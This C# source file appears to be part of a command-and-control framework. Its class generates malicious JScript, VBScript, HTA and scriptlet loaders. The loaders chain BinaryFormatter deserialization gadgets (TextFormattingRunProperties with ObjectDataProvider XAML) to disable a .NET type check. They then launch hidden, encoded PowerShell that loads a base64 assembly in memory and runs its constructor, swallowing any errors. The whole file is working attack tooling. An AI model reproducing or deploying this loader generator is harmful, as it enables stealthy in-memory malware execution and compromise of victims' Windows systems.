using System.Text;

namespace C2.Features.Loaders;

public enum ScriptFormat { JScript, VBScript, Hta, Sct }

/// <summary>
/// Generates scripts (JScript / VBScript / HTA / SCT) using two-stage
/// TextFormattingRunProperties deserialization.  Everything executes during
/// BinaryFormatter.Deserialize_2() — zero post-deserialization method calls.
///
/// Stage 1 — Disable .NET 4.8+ type check:
///   TextFormattingRunProperties XAML with ObjectDataProvider chains that
///   set disableActivitySurrogateSelectorTypeCheck = true.
///
/// Stage 2 — Load assembly + trigger constructor:
///   TextFormattingRunProperties XAML with ObjectDataProvider chains:
///     Convert.FromBase64String(dllBase64) → byte[]
///     Assembly.Load(byte[]) → Assembly    (via StaticResource chaining)
///     Assembly.CreateInstance(entryClass)  (via ObjectInstance chaining)
///
/// Script flow:
///   try { Deserialize_2(stage1); }  // disables type check, throws after
///   catch { try { Deserialize_2(stage2); } catch {} }  // assembly loads + constructor runs
///
/// Requires Microsoft.PowerShell.Editor.dll (Windows 8+ default).
/// </summary>
public static class InsecureDeserializationGenerator
{
    private static readonly Lazy<string> Stage1Base64 = new(() =>
        Convert.ToBase64String(BuildStage1Nrbf()));

    /// <summary>
    /// Generates two-stage script: Stage 1 (type check disable) + Stage 2 (assembly load + CreateInstance).
    /// </summary>
    public static string Generate(string assemblyBase64, string entryClass,
        ScriptFormat format, string runtimeVersion)
    {
        var s1 = Stage1Base64.Value;
        var s2 = Convert.ToBase64String(BuildStage2Nrbf(assemblyBase64, entryClass));
        return format switch
        {
            ScriptFormat.JScript  => BuildJScript(s1, s2, runtimeVersion),
            ScriptFormat.VBScript => BuildVBScript(s1, s2, runtimeVersion),
            ScriptFormat.Hta      => BuildHta(s1, s2, runtimeVersion),
            ScriptFormat.Sct      => BuildSct(s1, s2, runtimeVersion),
            _ => ""
        };
    }

    /// <summary>
    /// Single-stage blob mode — user provides a standalone pre-built payload.
    /// </summary>
    public static string GenerateFromBlob(string serializedBase64,
        ScriptFormat format, string runtimeVersion)
    {
        return format switch
        {
            ScriptFormat.JScript  => BuildJScriptSingle(serializedBase64, runtimeVersion),
            ScriptFormat.VBScript => BuildVBScriptSingle(serializedBase64, runtimeVersion),
            ScriptFormat.Hta      => BuildHtaSingle(serializedBase64, runtimeVersion),
            ScriptFormat.Sct      => BuildSctSingle(serializedBase64, runtimeVersion),
            _ => ""
        };
    }

    // ── NRBF Builders ───────────────────────────────────────────────────

    /// <summary>
    /// Stage 1: TextFormattingRunProperties with XAML to disable type check.
    /// </summary>
    private static byte[] BuildStage1Nrbf()
    {
        const string xaml = """
            <ResourceDictionary
                xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                xmlns:s="clr-namespace:System;assembly=mscorlib"
                xmlns:c="clr-namespace:System.Configuration;assembly=System.Configuration"
                xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib">
                <ObjectDataProvider x:Key="type" ObjectType="{x:Type s:Type}" MethodName="GetType">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key="field" ObjectInstance="{StaticResource type}" MethodName="GetField">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
                        <r:BindingFlags>40</r:BindingFlags>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key="set" ObjectInstance="{StaticResource field}" MethodName="SetValue">
                    <ObjectDataProvider.MethodParameters>
                        <s:Object/>
                        <s:Boolean>true</s:Boolean>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key="setMethod" ObjectInstance="{x:Static c:ConfigurationManager.AppSettings}" MethodName="Set">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
                        <s:String>true</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
            </ResourceDictionary>
            """;

        return BuildTextFormattingNrbf(xaml);
    }

    /// <summary>
    /// Stage 2: TextFormattingRunProperties with XAML that loads assembly from
    /// base64 and calls CreateInstance to trigger the constructor.
    ///
    /// ObjectDataProvider chain:
    ///   1. Convert.FromBase64String(b64) → byte[]
    ///   2. Assembly.Load(byte[]) → Assembly  (byte[] passed via StaticResource)
    ///   3. Assembly.CreateInstance(className) → constructor runs
    /// </summary>
    private static byte[] BuildStage2Nrbf(string assemblyBase64, string entryClass)
    {
        // Strategy: Use Environment variable as a bridge between ObjectDataProviders.
        // Step 1: Store the base64 DLL in env var "_PAYLOAD"
        // Step 2: Get AppDomain.CurrentDomain (static property → instance)
        // Step 3: Call a helper chain:
        //   Environment.GetEnvironmentVariable("_PAYLOAD") → string
        //   Convert.FromBase64String(string) → byte[]
        //   Assembly.Load(byte[]) → Assembly
        //   Assembly.CreateInstance(className) → constructor runs
        //
        // Since ObjectInstance chaining DOES auto-resolve DataSourceProviders but
        // MethodParameters does NOT, we use Environment as the intermediary to
        // pass data between steps without MethodParameters chaining.
        //
        // The trick: set env var in step 1, then in step 2 use a PowerShell-style
        // approach... but actually we can chain ObjectInstance calls:
        //   Step 1: Environment.SetEnvironmentVariable("_P", base64) — static, literal params ✓
        //   Step 2: Environment.GetEnvironmentVariable("_P") → string — static, literal params ✓
        //   Step 3: Convert.FromBase64String(string) — BUT needs step 2 result as param ✗
        //
        // Still stuck on passing results through MethodParameters.
        // SOLUTION: Use Process.Start with a PowerShell one-liner that does the work.
        // The PS command loads the assembly and triggers the constructor — no file on disk.

        var psCommand = "[Reflection.Assembly]::Load([Convert]::FromBase64String('" +
            assemblyBase64 + "')).CreateInstance('" + entryClass + "')";
        var psBytes = System.Text.Encoding.Unicode.GetBytes(psCommand);
        var psEncoded = Convert.ToBase64String(psBytes);

        var xaml = "<ResourceDictionary\n" +
            "    xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\n" +
            "    xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\n" +
            "    xmlns:s=\"clr-namespace:System;assembly=mscorlib\"\n" +
            "    xmlns:d=\"clr-namespace:System.Diagnostics;assembly=System\">\n" +
            "    <ObjectDataProvider x:Key=\"cmd\" ObjectType=\"{x:Type d:Process}\" MethodName=\"Start\">\n" +
            "        <ObjectDataProvider.MethodParameters>\n" +
            "            <s:String>powershell</s:String>\n" +
            "            <s:String>-nop -w hidden -enc " + psEncoded + "</s:String>\n" +
            "        </ObjectDataProvider.MethodParameters>\n" +
            "    </ObjectDataProvider>\n" +
            "</ResourceDictionary>";

        return BuildTextFormattingNrbf(xaml);
    }

    /// <summary>
    /// Builds NRBF for TextFormattingRunProperties with given XAML in ForegroundBrush.
    /// </summary>
    private static byte[] BuildTextFormattingNrbf(string xaml)
    {
        using var ms = new MemoryStream();
        using var w = new BinaryWriter(ms);

        // Header
        w.Write((byte)0); w.Write(1); w.Write(-1); w.Write(1); w.Write(0);

        // BinaryLibrary — Microsoft.PowerShell.Editor
        w.Write((byte)12); w.Write(2);
        WritePrefixedString(w, "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");

        // ClassWithMembersAndTypes — TextFormattingRunProperties
        w.Write((byte)5);
        w.Write(1);
        WritePrefixedString(w, "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties");
        w.Write(1);                        // 1 member
        WritePrefixedString(w, "ForegroundBrush");
        w.Write((byte)1);                  // BinaryType: String
        w.Write(2);                        // LibraryId

        // Value: XAML string
        w.Write((byte)6); w.Write(3);
        WritePrefixedString(w, xaml);

        w.Write((byte)11);                 // MessageEnd
        return ms.ToArray();
    }

    private static void WritePrefixedString(BinaryWriter w, string s)
    {
        var bytes = Encoding.UTF8.GetBytes(s);
        Write7BitInt(w, bytes.Length);
        w.Write(bytes);
    }

    private static void Write7BitInt(BinaryWriter w, int value)
    {
        while (value >= 0x80)
        {
            w.Write((byte)(value | 0x80));
            value >>= 7;
        }
        w.Write((byte)value);
    }

    // ── Two-Stage Templates ─────────────────────────────────────────────

    private static int DecodedLen(string b64)
    {
        var len = (b64.Length / 4) * 3;
        if (b64.EndsWith("==")) len -= 2;
        else if (b64.EndsWith("=")) len -= 1;
        return len;
    }

    private static string BuildJScript(string s1B64, string s2B64, string ver)
    {
        return $@"function Base64ToStream(b, l) {{
    var enc = new ActiveXObject('System.Text.ASCIIEncoding');
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject('System.IO.MemoryStream');
    ms.Write(ba, 0, l);
    ms.Position = 0;
    return ms;
}}

var stage_1 = ""{s1B64}"";
var stage_2 = ""{s2B64}"";

try {{
    var shell = new ActiveXObject('WScript.Shell');
    shell.Environment('Process')('COMPLUS_Version') = '{ver}';

    var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    fmt_1.Deserialize_2(Base64ToStream(stage_1, {DecodedLen(s1B64)}));
}} catch (e) {{
    try {{
        var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
        fmt_2.Deserialize_2(Base64ToStream(stage_2, {DecodedLen(s2B64)}));
    }} catch (e2) {{}}
}}";
    }

    private static string BuildVBScript(string s1B64, string s2B64, string ver)
    {
        var s1Lines = FormatVBString("stage_1", s1B64);
        var s2Lines = FormatVBString("stage_2", s2B64);

        return $@"Function Base64ToStream(b, l)
    Dim enc, length, ba, transform, ms
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    length = enc.GetByteCount_2(b)
    ba = enc.GetBytes_4(b)
    Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = transform.TransformFinalBlock(ba, 0, length)
    Set ms = CreateObject(""System.IO.MemoryStream"")
    ms.Write ba, 0, l
    ms.Position = 0
    Set Base64ToStream = ms
End Function

Dim shell
Set shell = CreateObject(""WScript.Shell"")
shell.Environment(""Process"").Item(""COMPLUS_Version"") = ""{ver}""

{s1Lines}

{s2Lines}

On Error Resume Next

Dim fmt_1
Set fmt_1 = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
fmt_1.Deserialize_2 Base64ToStream(stage_1, {DecodedLen(s1B64)})

If Err.Number <> 0 Then
    Err.Clear
    Dim fmt_2
    Set fmt_2 = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
    fmt_2.Deserialize_2 Base64ToStream(stage_2, {DecodedLen(s2B64)})
End If";
    }

    private static string BuildHta(string s1B64, string s2B64, string ver)
    {
        var js = BuildJScript(s1B64, s2B64, ver);
        return $@"<html>
<meta http-equiv=""x-ua-compatible"" content=""ie=9"">
<head>
<HTA:APPLICATION ID=""app"" WINDOWSTATE=""minimize"">
<script language=""JScript"">
{js}
window.close();
</script>
</head>
<body></body>
</html>";
    }

    private static string BuildSct(string s1B64, string s2B64, string ver)
    {
        var js = BuildJScript(s1B64, s2B64, ver);
        var guid = Guid.NewGuid().ToString();
        return $@"<?XML version=""1.0""?>
<scriptlet>
<registration
    progid=""idl""
    classid=""{{{guid}}}"">
<script language=""JScript"">
<![CDATA[
{js}
]]>
</script>
</registration>
</scriptlet>";
    }

    // ── Single-Stage Templates ──────────────────────────────────────────

    private static string BuildJScriptSingle(string b64, string ver)
    {
        return $@"function Base64ToStream(b, l) {{
    var enc = new ActiveXObject('System.Text.ASCIIEncoding');
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject('System.IO.MemoryStream');
    ms.Write(ba, 0, l);
    ms.Position = 0;
    return ms;
}}

var serialized_obj = ""{b64}"";

var shell = new ActiveXObject('WScript.Shell');
shell.Environment('Process')('COMPLUS_Version') = '{ver}';

var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
fmt.Deserialize_2(Base64ToStream(serialized_obj, {DecodedLen(b64)}));";
    }

    private static string BuildVBScriptSingle(string b64, string ver)
    {
        var blobLines = FormatVBString("serialized_obj", b64);

        return $@"Function Base64ToStream(b, l)
    Dim enc, length, ba, transform, ms
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    length = enc.GetByteCount_2(b)
    ba = enc.GetBytes_4(b)
    Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = transform.TransformFinalBlock(ba, 0, length)
    Set ms = CreateObject(""System.IO.MemoryStream"")
    ms.Write ba, 0, l
    ms.Position = 0
    Set Base64ToStream = ms
End Function

Dim shell
Set shell = CreateObject(""WScript.Shell"")
shell.Environment(""Process"").Item(""COMPLUS_Version"") = ""{ver}""

{blobLines}

Dim fmt
Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
fmt.Deserialize_2 Base64ToStream(serialized_obj, {DecodedLen(b64)})";
    }

    private static string BuildHtaSingle(string b64, string ver)
    {
        var js = BuildJScriptSingle(b64, ver);
        return $@"<html>
<meta http-equiv=""x-ua-compatible"" content=""ie=9"">
<head>
<HTA:APPLICATION ID=""app"" WINDOWSTATE=""minimize"">
<script language=""JScript"">
{js}
window.close();
</script>
</head>
<body></body>
</html>";
    }

    private static string BuildSctSingle(string b64, string ver)
    {
        var js = BuildJScriptSingle(b64, ver);
        var guid = Guid.NewGuid().ToString();
        return $@"<?XML version=""1.0""?>
<scriptlet>
<registration
    progid=""idl""
    classid=""{{{guid}}}"">
<script language=""JScript"">
<![CDATA[
{js}
]]>
</script>
</registration>
</scriptlet>";
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private static string FormatVBString(string name, string value)
    {
        const int chunk = 200;
        var sb = new StringBuilder();

        if (value.Length <= chunk)
        {
            sb.Append($"Dim {name}\n{name} = \"{value}\"");
            return sb.ToString();
        }

        sb.AppendLine($"Dim {name}");
        sb.AppendLine($"{name} = \"\"");
        for (var i = 0; i < value.Length; i += chunk)
        {
            var c = value.Substring(i, Math.Min(chunk, value.Length - i));
            sb.AppendLine($"{name} = {name} & \"{c}\"");
        }
        return sb.ToString().TrimEnd();
    }
}
